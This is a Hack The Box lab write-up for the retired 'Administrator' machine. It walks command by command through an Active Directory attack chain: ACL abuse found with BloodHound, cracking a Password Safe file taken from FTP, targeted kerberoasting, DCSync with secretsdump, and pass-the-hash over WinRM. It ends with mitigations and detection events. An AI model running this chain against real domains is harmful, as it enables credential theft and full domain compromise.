---
machine: Administrator
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, bloodhound, genericall, ftp, psafe3, kerberoasting, dcsync]
---

# Administrator — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

The box starts with low-privilege credentials (`olivia`). BloodHound shows the ACL chain: `olivia` has **GenericAll** over `michael`, `michael` has **ForceChangePassword** over `benjamin`, and `benjamin` is in `SHARE MODERATORS`, whose **FTP** access hands over `Backup.psafe3`. That Password Safe database cracks with `hashcat -m 5200` and holds `emily`'s credentials. Emily has **GenericWrite** over `ethan`: add an SPN and do *targeted kerberoasting*. Ethan's password grants **DCSync**, and `Administrator`'s hash gets WinRM.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV <IP> -oN nmap_svc.txt
```

```text
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: administrator.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

`FTP` on the DC plus open `WinRM`: the box is built so the last hop is `evil-winrm`.

```bash
echo "<IP> administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Validate access with `olivia` and collect:

```bash
nxc smb <IP> -u olivia -p '<PASSWORD>'
bloodhound-python -u olivia -p '<PASSWORD>' -d administrator.htb -ns <IP> -c All
```

The path BloodHound draws:

```text
olivia  --GenericAll-->            michael
michael --ForceChangePassword-->   benjamin
benjamin --memberOf-->             SHARE MODERATORS  --> FTP
```

`SHARE MODERATORS` grants FTP access on the DC. With `benjamin` the files are listed and downloaded:

```bash
lftp -u benjamin,'<PASSWORD>' <IP>
# ls; get Backup.psafe3
```

`Backup.psafe3` is a **Password Safe v3** database, which hashcat attacks in mode 5200:

```bash
hashcat -m 5200 Backup.psafe3 rockyou.txt
pwsafe --show -f Backup.psafe3      # or the official GUI, with the cracked master password
```

It holds entries for several users; the useful one is **`emily`**.

## Foothold

```bash
nxc smb <IP> -u emily -p '<PASSWORD>' --shares
```

No shell yet: Emily is a plain domain user without WinRM. Access comes through the next ACL.

## Lateral movement

The chain is horizontal between accounts, not hosts. Each credential comes from a legitimate resource (LDAP, FTP, a password manager) and is reused for the next hop.

## Privilege escalation

`emily` has **GenericWrite** over `ethan`. That allows writing an SPN onto the account and requesting a TGS to crack offline (*targeted kerberoasting*, no pre-existing SPN needed):

```bash
bloodyAD -u emily -p '<PASSWORD>' -d administrator.htb --host <IP> \
  add spn ethan -v 'http/ethan.administrator.htb'

impacket-GetUserSPNs administrator.htb/emily:'<PASSWORD>' -dc-ip <IP> \
  -request -outputfile ethan.tgs

hashcat -m 13100 ethan.tgs rockyou.txt
```

With Ethan's password, check his privilege and dump the domain:

```bash
impacket-secretsdump administrator.htb/ethan:'<PASSWORD>'@<IP> -just-dc-user Administrator
```

Ethan holds **DCSync** (`DS-Replication-Get-Changes` + `-All`), so the NTLM hash of `Administrator` comes back:

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

If the added SPN cannot be cleaned up, note it: it is an AD change that must be reverted in a real engagement.

## Evidence

- Trimmed BloodHound paths, `GetUserSPNs` and `secretsdump` output.
- No flags, hashes or passwords: real values live in `private/`.

## Lessons learned

- BloodHound does not "find the vulnerability": it draws the path; the work is reading it in order.
- `ForceChangePassword` over another user turns any account into the next identity without touching hashes.
- A `.psafe3` on an FTP is an entire password manager: `-m 5200` and a wordlist.
- GenericWrite over a user enables targeted kerberoasting: the victim need not be a service.
- DCSync from a plain user account is the usual ending: `-just-dc-user` avoids dumping the whole domain.

## Mitigations and detection

- Audit ACLs: GenericAll/GenericWrite/ForceChangePassword over human accounts must be documented exceptions.
- Move FTP off the DC and never store password managers on reachable shares.
- Long, rotated service passwords; gMSA for service accounts.
- Detection: 4720/4722/4724 (account creation and resets), 4738 (account changed) with `servicePrincipalName` in the diff, 4769 with `Ticket Encryption Type 0x17` (RC4) from an account with no prior SPN, and 4662 with `DS-Replication-Get-Changes-All`.
- Review `SHARE MODERATORS` membership and FTP access for plain users.

MITRE: T1098 (account manipulation), T1558.003 (kerberoasting), T1003.006 (DCSync), T1078 (valid accounts).

## References

- <https://www.hackthebox.com/machines/administrator>
- <https://blankshiro.xyz/posts/hackthebox/machines/hackthebox-administrator>
- <https://01mi.github.io/p/administrator-htb-writeup-windows-medium>
- <https://hashcat.net/wiki/doku.php?id=example_hashes>
